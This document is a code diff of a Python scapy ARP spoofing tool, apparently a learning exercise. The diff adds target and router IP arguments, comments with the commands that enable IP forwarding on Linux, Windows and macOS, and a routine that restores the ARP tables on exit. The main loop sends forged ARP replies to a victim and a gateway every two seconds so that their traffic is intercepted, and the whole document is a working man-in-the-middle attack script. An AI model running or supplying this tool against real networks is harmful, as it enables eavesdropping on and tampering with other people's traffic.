@@ -1,6 +1,40 @@
+# to run the program in linux, you need to activate the ip forwarding
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+# to deactivate the ip forwarding
+# echo 0 > /proc/sys/net/ipv4/ip_forward
+# to see the ip forwarding status
+# cat /proc/sys/net/ipv4/ip_forward
+# ---------------------------------------------------------------------------------------------------------------------
+# to run the program in windows, you need to enable the ip forwarding
+# by running the following command in the command prompt
+# reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 1
+# to disable the ip forwarding
+# reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 0
+# to see the ip forwarding status
+# reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter
+# ---------------------------------------------------------------------------------------------------------------------
+# to run the program in mac, you need to enable the ip forwarding
+# by running the following command in the terminal
+# sudo sysctl -w net.inet.ip.forwarding=1
+# to disable the ip forwarding
+# sudo sysctl -w net.inet.ip.forwarding=0
+# to see the ip forwarding status
+# sysctl -a | grep forward
 import time
-
 import scapy.all as scapy
+import argparse
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
+    parser.add_argument("-r", "--router", dest="router", help="Router IP address")
+    options = parser.parse_args()
+    if not options.target:
+        parser.error("[-] Please specify a target IP address, use --help for more info.")
+    elif not options.router:
+        parser.error("[-] Please specify a router IP address, use --help for more info.")
+    return options
 
 
 def get_mac(ip):
@@ -21,15 +55,27 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
-count = 0
+def restore_arp_table(destination_ip, source_ip):
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip,
+                       hwsrc=get_mac(source_ip))
+    # send the packet 4 times to make sure the destination machine gets the packet
+    scapy.send(packet, count=4, verbose=False)
+
+
+options = get_arguments()
+victim = options.target
+router = options.router
 try:
+    count = 0
     while True:
-        spoof("10.0.0.100", "10.0.0.1")
-        spoof("10.0.0.1", "10.0.0.100")
+        spoof(router, victim)
+        spoof(victim, router)
         count += 2
         # \r is used to print on the same line
         # dynamic printing
         print("\r[+] packets sent: " + str(count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL + C .... Resetting ARP tables.... Please wait.")
+    restore_arp_table(router, victim)
+    restore_arp_table(victim, router)
+    print("\n[+] Restored ARP table. Exiting...")
